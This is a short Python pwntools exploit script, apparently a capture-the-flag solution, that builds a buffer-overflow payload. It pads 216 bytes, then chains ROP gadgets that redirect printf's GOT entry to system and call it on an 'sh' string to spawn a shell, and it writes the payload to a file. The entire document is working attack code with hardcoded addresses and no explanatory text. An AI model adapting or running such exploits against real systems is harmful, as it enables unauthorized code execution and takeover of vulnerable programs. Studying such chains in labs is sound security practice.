from pwn import *

printf_got = 0x0000000000401054
printf_plt = 0x0000000000401050
printf_got_plt = 0x404000
ret = 0x00000000004011d7
poprdi = 0x000000000040115a
poprbp = 0x000000000040113d
subrdi_rbp = 0x0000000000401156
system_offset = 0x7ffff7c5c740 - 0x7ffff7c55230
dummy_sh = 0x403004

junk = b'A'*216

payload = junk
payload += p64(ret)
payload += p64(poprdi)
payload += p64(printf_got_plt)
payload += p64(poprbp)
payload += p64(system_offset)
payload += p64(subrdi_rbp)

payload += p64(ret)
payload += p64(poprdi)
payload += p64(dummy_sh)
payload += p64(printf_plt)

exploit = payload

with open('exploit', 'wb') as payload:
    payload.write(exploit)




